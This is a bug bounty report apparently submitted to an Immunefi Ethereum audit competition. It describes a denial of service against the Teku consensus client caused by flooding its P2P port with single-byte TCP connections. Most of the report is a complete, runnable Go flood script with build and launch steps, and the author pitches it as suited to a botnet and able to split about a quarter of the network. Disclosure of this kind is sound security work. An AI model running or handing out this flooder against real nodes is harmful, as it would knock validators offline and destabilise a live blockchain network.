# #37505 \[BC-Insight] Remotely spamming 1 byte leads to full peer removal and desync in both execution and consensus clients

**Submitted on Dec 6th 2024 at 16:49:18 UTC by \[redacted] for** [**Attackathon | Ethereum Protocol**](https://immunefi.com/audit-competition/ethereum-protocol-attackathon)

* **Report ID:** #37505
* **Report Type:** Blockchain/DLT
* **Report severity:** Insight
* **Target:** <https://github.com/Consensys/teku>
* **Impacts:**
  * Causing greater than or equal to 25% of network processing nodes to process transactions from the mempool beyond set parameters (e.g. prevents processing transactions from the mempool)
  * Unintended chain split affecting greater than or equal to 25% of the network (Network partition)
  * Causes desynchronization in both Consensus and Execution clients

## Description

## Brief/Intro

A remote desynchronization (P2P DoS) exploit has been identified in Teku 24.10.3. A single attacking machine can disable remote nodes by spamming a blank space over raw tcp/9000.

## Vulnerability Details

The latest release is susceptible to a simple remote DoS. Unlike a process crash, it recovers after a couple of minutes when the script is turned off - but with a sustained botnet attack, it's an irrelevant detail, because the attack would come from a botnet regardless.

During the attack, the test/victim node machine running `teku` struggles to operate and maintain SSH comms - despite no significant rise in MEM or CPU - oddly. I have no explanation for that and in fact hope that you might.

It only requires a single attacking machine to complete the DoS. I used a 4 CPU core Ubuntu VPS to attack. The provided script automatically scales in a way that accommodates system CPU resources on the attack machine - rendering it perfect for a botnet, and for testing.

## Impact Details

As of now, Teku comprises 25.37% of the consensus layer. An attack surface of this size being attacked simultaneously, disabling all P2P comms between nodes running `teku`, we'd see bad netsplits. Both execution and consensus clients would be thrown out of sync all at once and the network would be fractured.

## Attack code and steps to reproduce

### Attack script (golang)

```
package main

import (
    "fmt"
    "net"
    "runtime"
    "sync/atomic"
    "syscall"
    "time"
)

const (
    nodeAddress = "127.0.0.1:9000"
    payload     = " "
)

type stats struct {
    count      uint64
    errorCount uint64
}

var payloadBytes = []byte(payload)
var targetAddr *syscall.SockaddrInet4

func init() {
    // Pre-resolve the target address
    addr, err := net.ResolveTCPAddr("tcp", nodeAddress)
    if err != nil {
        panic(err)
    }
    ip := addr.IP.To4()
    targetAddr = &syscall.SockaddrInet4{
        Port: addr.Port,
        Addr: [4]byte{ip[0], ip[1], ip[2], ip[3]},
    }
}

func worker(s *stats) {
    for {
        // Create raw socket
        fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)
        if err != nil {
            atomic.AddUint64(&s.errorCount, 1)
            continue
        }

        // Set non-blocking
        syscall.SetNonblock(fd, true)

        // Connect without waiting
        err = syscall.Connect(fd, targetAddr)
        if err != nil && err != syscall.EINPROGRESS {
            syscall.Close(fd)
            atomic.AddUint64(&s.errorCount, 1)
            continue
        }

        // Send without waiting for connection completion
        syscall.Write(fd, payloadBytes)
        syscall.Close(fd)
        atomic.AddUint64(&s.count, 1)
    }
}

func printStats(s *stats) {
    start := time.Now()
    lastCount := uint64(0)
    lastTime := start

    ticker := time.NewTicker(time.Second)
    defer ticker.Stop()

    for range ticker.C {
        now := time.Now()
        currentCount := atomic.LoadUint64(&s.count)
        currentErrors := atomic.LoadUint64(&s.errorCount)

        elapsed := now.Sub(lastTime).Seconds()
        rate := float64(currentCount-lastCount) / elapsed
        totalElapsed := now.Sub(start).Seconds()

        fmt.Printf("Sent: %d, Errors: %d, Rate: %.2f/s, Avg Rate: %.2f/s\n",
            currentCount, currentErrors, rate, float64(currentCount)/totalElapsed)

        lastCount = currentCount
        lastTime = now
    }
}

func main() {
    runtime.GOMAXPROCS(runtime.NumCPU())

    s := &stats{}

    numWorkers := 500 * runtime.NumCPU()
    fmt.Printf("Starting %d workers across %d CPUs...\n", numWorkers, runtime.NumCPU())

    go printStats(s)

    for i := 0; i < numWorkers; i++ {
        go worker(s)
    }

    select {}
}
```

If you need any technical assistance whatsoever, I'm around.

### Steps to reproduce (Ubuntu)

1. Paste the code above into a text editor, change "127.0.0.1:9000" to your `teku` server's IP:P2PPort and save the file as `attack.go`
2. `snap install go --classic`
3. `ulimit -n 100000`
4. `go build attack.go`
5. `./attack`

Let it run patiently and observe the undesirable behavior of the test victim node.

## Proof of Concept

## Proof of Concept

Screenshots of the attack and functioning attack code serve as the PoC to this vulnerability.
